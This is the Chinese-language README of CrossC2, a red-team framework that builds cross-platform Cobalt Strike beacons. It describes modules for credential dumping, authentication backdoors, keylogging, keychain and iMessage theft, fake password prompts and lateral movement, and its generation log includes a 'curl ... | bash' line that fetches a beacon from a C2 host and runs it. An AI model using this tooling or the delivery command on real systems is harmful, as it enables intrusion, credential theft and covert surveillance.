# CrossC2 framework

[README](README.md) | [中文文档](README_zh.md)

🚀 更快捷的生成方式，参见 **cna** 介绍 [GO📌](#cna插件方式)

🔥 **Linux** & **MacOS** 支持无文件落地从内存中加载执行 **动态库** 或 **可执行文件** [GO📖](https://gloxec.github.io/CrossC2/zh_cn/api/)

🔥 灵活自定义执行文件的数据返回类型，**端口扫描**, **屏幕截图**, **键盘记录**, **口令凭证** 等用户自定义开发实现更便捷 [GO📖](https://gloxec.github.io/CrossC2/zh_cn/api/commons.html)    ( [样例: GO📌](#CustomExtension) )

🔥 自定义通信协议 [GO📖](https://gloxec.github.io/CrossC2/zh_cn/protocol/)

🔥 现已支持横向移动 [GO📌](#横向移动: 使用方法)

🎉 **Android** & **iPhone** 支持 [GO📌](#Mobile)


# CrossC2 framework - 生成CobaltStrike的跨平台beacon

```
	 ▄████▄   ██▀███   ▒█████    ██████   ██████     ▄████▄   ██████▄
	▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██    ▒    ▒██▀ ▀█        ██░
	▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ░ ▓██▄      ▒▓█        █████▒
	▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░  ▒   ██▒  ▒   ██▒   ▒▓▓▄ ▄█ ░▒██
	▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒▒██████▒▒   ▒ ▓███▀  ░▒▓█████▓
	░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░   ░ ░▒ ▒    ░▒ ░▓ ░░
	  ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░░ ░▒  ░ ░     ░  ▒     ░ ░░ ░
	░          ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ░  ░  ░  CrossC2 v2.0 @hook
	░ ░         ░         ░ ░        ░        ░     ░ ░          ░
	░                                               ░     
```

![](media/15901534124389/15985513904454.jpg)

![](media/15848885324084/15848892759774.jpg)


# Description

面向企业自身及红队人员的安全评估框架，支持CobaltStrike对其他平台(Linux/MacOS/...)的安全评估，支持自定义模块，及包含一些常用的渗透模块。

`仅做企业、组织内部自身使用，本框架具有一定脆弱性，非专业人员请勿使用，以及禁止用于非法用途及盈利等，否则造成经济损失等问题自行承担并追究其相关责任!`


|  | Windows | Linux | MacOS | iOS | Android | Embedded |
| --- | --- | --- | --- | --- | --- | --- |
| Run Env (x86) |  | √ |  |  |  |  |
| Run Env (x64) | √ | √ | √ |  |  |  |
| gen beacon (x86) |  | √ |  |  | √ |  |
| gen beacon (x64) |  | √ | √ |  |  |  |
| gen beacon (armv7) |  |  |  | ⍻  | √ |  |
| gen beacon (arm64) |  |  |  | √ | √ |  |
| gen beacon (mips[el]) |  |  |  |  |  | ⍻ |

受限说明:
* CobaltStrike: 暂时仅支持3.14最后一个版本(bug fixs).
* Linux: 特别老旧的系统可以选择cna中的"Linux-GLIBC"选项（2010年左右）
* MacOS: 新系统仅支持64位程序
* iOS: sandbox 
* Embedded: only *nix
* ⍻ : 加载还在完善中

# Install & Usage

> 下载基础文件:

* **CrossC2.cna**
* **genCrossC2** `(如果操作系统是Windows, 下载genCrossC2.Win.exe)`

1. 选择`Script Manager`，添加`CrossC2.cna` (如果成功安装，菜单栏会多出一项 `CrossC2`)
2. 修改`CrossC2.cna`脚本中`genCC2`路径为**真实路径**

```
77:    $genCC2 = "/xxx/xx/xx/genCrossC2.MacOS";  # <-------- fix
```

> 建立listener与拷贝key:

因为一些原因，目前强制只支持HTTPS beacon。

**复制server上cs目录下的 `.cobaltstrike.beacon_keys`到本地目录下**


## 安装参考文档: [📖 Wiki](https://gloxec.github.io/CrossC2/zh_cn/usage/)

## 自定义模块: API介绍 [📖 Wiki](https://gloxec.github.io/CrossC2/zh_cn/api/)

采用内存无落地加载方式，支持动态库(.so/.dylib)以及可执行文件(ELF/MachO)。
`⚠️: 虽然文件是直接从内存加载的，但选用可执行文件的方式在传入参数时，进程是可以在ps中查看到的，不过进程名可以自定义。`

执行时输出信息的类型可以自由指定，已预定了返回类型，可对接CS原生的返回数据类型。
`⚠️: 关于特殊的数据类型，如密码，端口扫描结果等，请参照cs原生功能返回的信息编写，将按照正则匹配。`

1. 密码dump模块：cc2_mimipenguin 采用开源项目 MimiPenguin2.0，参见 CrossC2Kit/mimipenguin/mimipenguin.cna

2. 认证后门模块：cc2_auth, cc2_ssh sudo/su/passwd等认证后门，ssh被连接及连接其他主机的凭证都将被记录。

3. 信息收集模块：cc2_safari_dump, cc2_chrome_dump, cc2_iMessage_dump, cc2_keychain_dump 常见浏览器的访问记录，以及iMessage聊天内容与钥匙串中保存的认证凭据都将被获取。

4. 流量代理模块：cc2_frp 支持快速TCP/KCP(UDP)的反向socks5加密流量代理。

5. 键盘记录模块：cc2_keylogger 记录用户的键盘输入。

6. 网络探测模块：cc2_portscan, cc2_serverscan 进行端口扫描及服务版本扫描。

7. 权限提升模块：cc2_prompt_spoof 诱导欺骗获取用户账户密码。

8. 任务管理模块：cc2_job 管理内存中运行的模块。

9. ...


## 自定义通信协议: API介绍 [📖 Wiki](https://gloxec.github.io/CrossC2/zh_cn/protocol/)

可以更便捷的实现C2Profile配置及自定义通信协议TCP/UDP等等。 

## 横向移动: 使用方法 [📖 Wiki]()

1. 生成 `Linux-bind` / `MacOS-bind` 类型的beacon
2. 内网中的目标运行 `./MacOS-bind.beacon <port>` 开启服务
3. 在网络联通的session中运行 `connect <targetIP>:<port>`


## cna插件方式

```
菜单栏: CrossC2 -> CrossC2 Payload Generator -> genCrossC2

弹出的对话框中可以配置:
1. 选择beacon_key(路径中不可以包含空格，该问题暂时未解决)
2. 需要给beacon绑定的自定义通信协议动态库
3. Payload类型(Staged生成的shellcode需要stagerServer)
```

![](media/15901534124389/15901617930412.jpg)

生成时信息状态会在event界面中提示

```
05/01 23:31:03 *** /mnt/cc2/genCrossC2.MacOS 172.16.251.1 5555 /tmp/beacon_keys null MacOS x64 /tmp/CrossC2-test
05/01 23:31:06 *** genCrossC2 beacon -> *[success] :	Packed 1532232 byte.
05/01 23:31:07 *** hook hosted CrossC2 beacon MacOS x64 @ http://172.16.251.1:55413/iqEBVKwHoZ
05/01 23:31:07 *** hook hosted Script Unix Web Delivery (curl) @ http://172.16.251.1:55413/a
05/01 23:31:07 *** CrossC2 MacOS x64:   curl -A o -o- -L http://172.16.251.1:55413/a | bash -s
```


# 即将上线

1. 丰富的C2Profile支持 ✔︎ (cna生成beaocn时选择自定义HTTP模块)
2. Staged类型Shellcode生成 ✔︎ (暂时只支持Linux，并且需要在server服务器上启动stagerServer)
3. http-proxy (auth) & socks 代理回连支持
4. 流量中转支持 ✔︎ (暂时采用回连socks代理的方式)
5. node beacon? (单个节点式，可进行不依靠teamserver托管其他beacon)

# Examples

## Mobile
![](media/15848885324084/15848892759774.jpg)

![](media/15848885324084/15848892902723.jpg)

## MacOS & Linux

![](media/15794884596715/15795001494711.jpg)
![](media/15824278372797/15824282351545.jpg)

## CustomExtension

开发动态库，自定义数据返回类型，例如实现一些内置功能。

### 键盘记录
![](media/15854585486601/15854592406527.jpg)

### 口令凭证
![](media/15854585486601/15854601104042.jpg)

### 端口扫描
![](media/15854585486601/15854593957704.jpg)

# ChangeLog

## release v2.0 :

* -修复 修复文件管理处上传文件时带反斜杠导致路径出错的问题
* -修复 真实环境中多种场景下长时间测试，修复一些隐藏的问题，现在更加稳定
* +支持 更低内核版本系统的支持
* +支持 启动时环境变量自动设置
* +支持 启动时敏感env记录删除
* +支持 启动时可后台服务进程方式挂属init进程下
* +支持 增加session spawn功能
* +支持 增加session 设置环境变量的功能
* +支持 增加session getsystem权限提升功能
* +支持 增加session 处理多个合并任务的解析功能
* +支持 增加 Mac & Linux 横向移动的功能

## release v1.5 :

* -修复 修复genCrossC2的通讯协议重绑定错误

## release v1.4 :

* -修复 Linux后台进程与joblist显示错误的问题

## release v1.3 :

* +支持 支持自定义通信协议 (HTTP, TCP, UDP...) .
* +支持 新添加了joblist模块，可用来管理内存中持续运行的模块.
* +支持 添加了反向代理模块{TCP/KCP(UDP)}，同样属于内存无落地运行.


md5(genCrossC2.Linux) = 221b3ede4e78fee80f59946f116d7245

md5(genCrossC2.MacOS) = d216cad3fe3c25ead46b85c7ad7051f1

md5(genCrossC2.Win.exe) = a573506e8825b46b041ac3b9307a656b

## release v1.2 :

* +支持 可以支持选择生成beacon时所需的key文件.
* +支持 支持生成shellcode.
* -变更 不再依赖cobaltstrike.jar (意味着CrossC2插件可以放在任意位置).
* -变更 更加便捷的Unix系统上线方式.

md5(genCrossC2.Linux) = 2ef7250cc3787d3cbd1e6f99c3c434aa

md5(genCrossC2.MacOS) = eaabde94dd7fed8dabb37cd67a1171c4

md5(genCrossC2.Win.exe) = c65ac808ed3a1000b3ff4ebb8c48ea4e

## release v1.1 :

* -修复 内存加载执行功能的多国语言乱码问题修复

md5(genCrossC2.Linux) = 2347ed6e30e4655b793a6dbb4d33d25c

md5(genCrossC2.MacOS) = f530333500a76fe228864f8901af4104

md5(genCrossC2.Win.exe) = c223e31b2674a8a11d3254f92259e87a

## release v1.0 :

* -修复 真实环境中多种场景下长时间多次测试，修复一些隐藏的问题，现在更加稳定
* +支持 Linux & MacOS 支持无文件内存加载执行
* +支持 预留CS内置数据类型，更加丰富的用户自定义插件返回数据类型，可自由便捷实现'portscan'等等原生功能

md5(genCrossC2.Linux) = 12295998d4bffd5b4c4a411fb33428bb

md5(genCrossC2.MacOS) = c88ce9df47529b243e2215a866d445c5

md5(genCrossC2.Win.exe) = 51d1814f1ebbab634bce0373ceb7cee6

## release v0.4 :

* -变更 shell命令执行时采用后台多线程方式
* -变更 shell命令执行时错误输出重定向到标准输出
* +支持 增加后台文件下载功能

md5(genCrossC2.Linux) = b2e34f721ec2543b6625e33c8c2935df

md5(genCrossC2.MacOS) = 4e38a9d9a3eeff309648afc02e2e7664

## release v0.3 :

* +支持 老系统Linux上低版本GLIBC的兼容 (2010年左右)

## release v0.2 : 

* -修复 Linux genCrossC2.Linux 崩溃的bug.
* -修复 大文件上传时末尾字节写入不全的bug.
* +支持 GUI的文件管理器.

md5(genCrossC2.Linux) = 8256374d88c2149efc102aff7e90b3f9

md5(genCrossC2.MacOS) = 08fce0a5d964a091d8bf2344d7ab809e

## release v0.1 : 

* 支持 生成 Linux & MacOS beacon.

md5(genCrossC2.Linux) = f4c0cc85c7cdd096d2b7febedc037538

md5(genCrossC2.MacOS) = 79fff0505092fc2055824ed1289ce8f9









